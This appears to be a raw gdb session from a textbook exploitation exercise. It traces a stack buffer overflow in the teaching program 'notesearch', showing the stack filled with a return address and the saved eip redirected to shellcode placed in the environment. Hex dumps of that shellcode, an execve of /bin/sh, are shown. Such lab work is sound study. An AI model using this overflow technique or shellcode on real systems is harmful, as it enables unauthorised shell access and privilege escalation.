âžœ   sudo gdb -q --args ./exploit_notesearch_env
Reading symbols from ./exploit_notesearch_env...done.
(gdb) b main
Breakpoint 1 at 0x8048608: file exploit_notesearch_env.c, line 32.
(gdb) r
Starting program: /home/xeratec/Dokumente/GitHub/ArtOfExploitation/exploit_notesearch_env 

Breakpoint 1, main (argc=1, argv=0xbffffbc4) at exploit_notesearch_env.c:32
32		char *env[2] = { shellcode, 0 };
(gdb) c
Continuing.
[DEBUG] Return Address at 0xbfffffc9
process 4008 is executing new program: /home/xeratec/Dokumente/GitHub/ArtOfExploitation/notesearch

Breakpoint 1, 0x080486d3 in main ()
(gdb) disassemble main
Dump of assembler code for function main:
   0x080486c4 <+0>:	lea    ecx,[esp+0x4]
   0x080486c8 <+4>:	and    esp,0xfffffff0
   0x080486cb <+7>:	push   DWORD PTR [ecx-0x4]
   0x080486ce <+10>:	push   ebp
   0x080486cf <+11>:	mov    ebp,esp
   0x080486d1 <+13>:	push   ebx
   0x080486d2 <+14>:	push   ecx
=> 0x080486d3 <+15>:	sub    esp,0x70
   0x080486d6 <+18>:	mov    ebx,ecx
   0x080486d8 <+20>:	mov    DWORD PTR [ebp-0xc],0x1
   0x080486df <+27>:	cmp    DWORD PTR [ebx],0x1
   0x080486e2 <+30>:	jle    0x80486fe <main+58>
   0x080486e4 <+32>:	mov    eax,DWORD PTR [ebx+0x4]
   0x080486e7 <+35>:	add    eax,0x4
   0x080486ea <+38>:	mov    eax,DWORD PTR [eax]
   0x080486ec <+40>:	sub    esp,0x8
   0x080486ef <+43>:	push   eax
   0x080486f0 <+44>:	lea    eax,[ebp-0x78]
   0x080486f3 <+47>:	push   eax
   0x080486f4 <+48>:	call   0x80484a0 <strcpy@plt>
   0x080486f9 <+53>:	add    esp,0x10
   0x080486fc <+56>:	jmp    0x8048702 <main+62>
   0x080486fe <+58>:	mov    BYTE PTR [ebp-0x78],0x0
   0x08048702 <+62>:	cmp    DWORD PTR [ebx],0x2
   0x08048705 <+65>:	jle    0x8048711 <main+77>
   0x08048707 <+67>:	mov    DWORD PTR ds:0x8049e00,0x1
   0x08048711 <+77>:	mov    eax,ds:0x8049e00
   0x08048716 <+82>:	test   eax,eax
   0x08048718 <+84>:	je     0x804872e <main+106>
   0x0804871a <+86>:	sub    esp,0x8
   0x0804871d <+89>:	lea    eax,[ebp-0x78]
   0x08048720 <+92>:	push   eax
   0x08048721 <+93>:	push   0x8048a54
   0x08048726 <+98>:	call   0x8048460 <printf@plt>
   0x0804872b <+103>:	add    esp,0x10
   0x0804872e <+106>:	call   0x8048480 <getuid@plt>
   0x08048733 <+111>:	mov    DWORD PTR [ebp-0x10],eax
   0x08048736 <+114>:	sub    esp,0x8
   0x08048739 <+117>:	push   0x0
   0x0804873b <+119>:	push   0x8048a70
   0x08048740 <+124>:	call   0x80484e0 <open@plt>
   0x08048745 <+129>:	add    esp,0x10
   0x08048748 <+132>:	mov    DWORD PTR [ebp-0x14],eax
   0x0804874b <+135>:	cmp    DWORD PTR [ebp-0x14],0xffffffff
   0x0804874f <+139>:	jne    0x804877b <main+183>
   0x08048751 <+141>:	sub    esp,0xc
   0x08048754 <+144>:	push   0x8048a7c
   0x08048759 <+149>:	call   0x804863b <fatal>
   0x0804875e <+154>:	add    esp,0x10
   0x08048761 <+157>:	jmp    0x804877b <main+183>
   0x08048763 <+159>:	sub    esp,0x4
   0x08048766 <+162>:	lea    eax,[ebp-0x78]
   0x08048769 <+165>:	push   eax
   0x0804876a <+166>:	push   DWORD PTR [ebp-0x10]
   0x0804876d <+169>:	push   DWORD PTR [ebp-0x14]
   0x08048770 <+172>:	call   0x80487ae <print_notes>
   0x08048775 <+177>:	add    esp,0x10
   0x08048778 <+180>:	mov    DWORD PTR [ebp-0xc],eax
   0x0804877b <+183>:	cmp    DWORD PTR [ebp-0xc],0x0
   0x0804877f <+187>:	jne    0x8048763 <main+159>
   0x08048781 <+189>:	sub    esp,0xc
   0x08048784 <+192>:	push   0x8048aa8
   0x08048789 <+197>:	call   0x80484c0 <puts@plt>
   0x0804878e <+202>:	add    esp,0x10
   0x08048791 <+205>:	sub    esp,0xc
   0x08048794 <+208>:	push   DWORD PTR [ebp-0x14]
   0x08048797 <+211>:	call   0x8048510 <close@plt>
   0x0804879c <+216>:	add    esp,0x10
   0x0804879f <+219>:	mov    eax,0x0
=> 0x080487a4 <+224>:	lea    esp,[ebp-0x8]
   0x080487a7 <+227>:	pop    ecx
   0x080487a8 <+228>:	pop    ebx
   0x080487a9 <+229>:	pop    ebp
=> 0x080487aa <+230>:	lea    esp,[ecx-0x4]
=> 0x080487ad <+233>:	ret    
End of assembler dump.
(gdb) b *0x080487a4
Breakpoint 2 at 0x80487a4
(gdb) b *0x080487aa
Breakpoint 3 at 0x80487aa
(gdb) b *0x080487ad
Breakpoint 4 at 0x80487ad
(gdb) i r
eax            0xb7fb5dbc	-1208263236
ecx            0xbffffdb0	-1073742416
edx            0xbffffdd4	-1073742380
ebx            0x0	0
esp            0xbffffd90	0xbffffd90
ebp            0xbffffd98	0xbffffd98
esi            0xb7fb4000	-1208270848
edi            0xb7fb4000	-1208270848
eip            0x80486d3	0x80486d3 <main+15>
eflags         0x286	[ PF SF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) i f
Stack level 0, frame at 0xbffffdb0:
 eip = 0x80486d3 in main; saved eip = 0xb7e1d5f7
 Arglist at 0xbffffd98, args: 
 Locals at 0xbffffd98, Previous frame's sp is 0xbffffdb0
 Saved registers:
  ebx at 0xbffffd94, ebp at 0xbffffd98, eip at 0xbffffdac
(gdb) x/40wx $esp
0xbffffd90:	0xbffffdb0	0x00000000	0x00000000	0xb7e1d5f7
0xbffffda0:	0xb7fb4000	0xb7fb4000	0x00000000	0xb7e1d5f7
0xbffffdb0:	0x00000002	0xbffffe44	0xbffffe50	0x00000000
0xbffffdc0:	0x00000000	0x00000000	0xb7fb4000	0xb7fffc04
0xbffffdd0:	0xb7fff000	0x00000000	0xb7fb4000	0xb7fb4000
0xbffffde0:	0x00000000	0xa260c895	0x9e30c685	0x00000000
0xbffffdf0:	0x00000000	0x00000000	0x00000002	0x08048540
0xbffffe00:	0x00000000	0xb7feff10	0xb7fea7a0	0xb7fff000
0xbffffe10:	0x00000002	0x08048540	0x00000000	0x08048561
0xbffffe20:	0x080486c4	0x00000002	0xbffffe44	0x080489b0
(gdb) x/4wx $ebp
0xbffffd98:	0x00000000	0xb7e1d5f7	0xb7fb4000	0xb7fb4000
(gdb) c
Continuing.
[DEBUG] searchstring at 0xbffffd20
-----[ end of note data ]-----

Breakpoint 2, 0x080487a4 in main ()
(gdb) i r
eax            0x0	0
ecx            0xffffffff	-1
edx            0xbffffdb0	-1073742416
ebx            0xbffffdb0	-1073742416
esp            0xbffffd20	0xbffffd20
ebp            0xbffffd98	0xbffffd98
esi            0xb7fb4000	-1208270848
edi            0xb7fb4000	-1208270848
eip            0x80487a4	0x80487a4 <main+224>
...
(gdb) i f
Stack level 0, frame at 0xbfffffc9:
 eip = 0x80487a4 in main; saved eip = 0xbfffffc9
 Arglist at 0xbffffd98, args: 
 Locals at 0xbffffd98, Previous frame's sp is 0xbfffffc9
 Saved registers:
  ebx at 0xbffffd94, ebp at 0xbffffd98, eip at 0xbfffffc5
(gdb) x/40wx $esp
0xbffffd20:	0xbfffffc9	0xbfffffc9	0xbfffffc9	0xbfffffc9
0xbffffd30:	0xbfffffc9	0xbfffffc9	0xbfffffc9	0xbfffffc9
0xbffffd40:	0xbfffffc9	0xbfffffc9	0xbfffffc9	0xbfffffc9
0xbffffd50:	0xbfffffc9	0xbfffffc9	0xbfffffc9	0xbfffffc9
0xbffffd60:	0xbfffffc9	0xbfffffc9	0xbfffffc9	0xbfffffc9
0xbffffd70:	0xbfffffc9	0xbfffffc9	0xbfffffc9	0xbfffffc9
0xbffffd80:	0xbfffffc9	0x00000003	0x00000000	0x00000000
0xbffffd90:	0xbfffffc9	0xbfffffc9	0xbfffffc9	0xbfffffc9
0xbffffda0:	0xbfffffc9	0xbfffffc9	0xbfffffc9	0xbfffffc9
0xbffffdb0:	0xbfffffc9	0xbfffffc9	0xbfffffc9	0xbfffffc9
(gdb) x/4wx $ebp
0xbffffd98:	0xbfffffc9	0xbfffffc9	0xbfffffc9	0xbfffffc9
(gdb) x/4wx $ebp-0x8
0xbffffd90:	0xbfffffc9	0xbfffffc9	0xbfffffc9	0xbfffffc9
(gdb) c
Continuing.

Breakpoint 3, 0x080487aa in main ()
(gdb) i r
eax            0x0	0
ecx            0xbfffffc9	-1073741879
edx            0xbffffdb0	-1073742416
ebx            0xbfffffc9	-1073741879
esp            0xbffffd9c
ebp            0xbfffffc9	0xbfffffc9
esi            0xb7fb4000	-1208270848
edi            0xb7fb4000	-1208270848
eip            0x80487aa	0x80487aa <main+230>
...
(gdb) i f
Stack level 0, frame at 0xbfffffc9:
 eip = 0x80487aa in main; saved eip = 0xbfffffc9
 Arglist at 0xbfffffc9, args: 
 Locals at 0xbfffffc9, Previous frame's sp is 0xbfffffc9
 Saved registers:
  eip at 0xbfffffc5
(gdb) x/40wx $esp
0xbffffd9c:	0xbfffffc9	0xbfffffc9	0xbfffffc9	0xbfffffc9
0xbffffdac:	0xbfffffc9	0xbfffffc9	0xbfffffc9	0xbfffffc9
0xbffffdbc:	0xbfffffc9	0x00000000	0x00000000	0xb7fb4000
0xbffffdcc:	0xb7fffc04	0xb7fff000	0x00000000	0xb7fb4000
0xbffffddc:	0xb7fb4000	0x00000000	0xa260c895	0x9e30c685
0xbffffdec:	0x00000000	0x00000000	0x00000000	0x00000002
0xbffffdfc:	0x08048540	0x00000000	0xb7feff10	0xb7fea7a0
0xbffffe0c:	0xb7fff000	0x00000002	0x08048540	0x00000000
0xbffffe1c:	0x08048561	0x080486c4	0x00000002	0xbffffe44
0xbffffe2c:	0x080489b0	0x08048a10	0xb7fea7a0	0xbffffe3c
(gdb) x/4wx $ebp
0xbfffffc9:	0x5b16eb00	0x4388c031	0x085b8907	0x8d0c4389
(gdb) x/4wx $ecx-0x4
0xbfffffc5:	0xbfffffc9	0x5b16eb00	0x4388c031	0x085b8907
(gdb) c
Continuing.

Breakpoint 4, 0x080487ad in main ()
(gdb) i r
eax            0x0	0
ecx            0xbfffffc9	-1073741879
edx            0xbffffdb0	-1073742416
ebx            0xbfffffc9	-1073741879
esp            0xbfffffc5	0xbfffffc5
ebp            0xbfffffc9	0xbfffffc9
esi            0xb7fb4000	-1208270848
edi            0xb7fb4000	-1208270848
eip            0x80487ad	0x80487ad <main+233>
...
(gdb) i f
Stack level 0, frame at 0xbfffffc9:
 eip = 0x80487ad in main; saved eip = 0xbfffffc9
 Arglist at 0xbfffffc9, args: 
 Locals at 0xbfffffc9, Previous frame's sp is 0xbfffffc9
 Saved registers:
  eip at 0xbfffffc5
(gdb) x/40wx $esp
0xbfffffc5:	0xbfffffc9	0x5b16eb00	0x4388c031	0x085b8907
0xbfffffd5:	0x8d0c4389	0x538d084b	0xcd0bb00c	0xffe5e880
0xbfffffe5:	0x622fffff	0x732f6e69	0x2f2e0068	0x65746f6e
0xbffffff5:	0x72616573	0x00006863	Cannot access memory at address 0xc0000000
(gdb) x/4wx $ebp
0xbfffffc9:	0x5b16eb00	0x4388c031	0x085b8907	0x8d0c4389
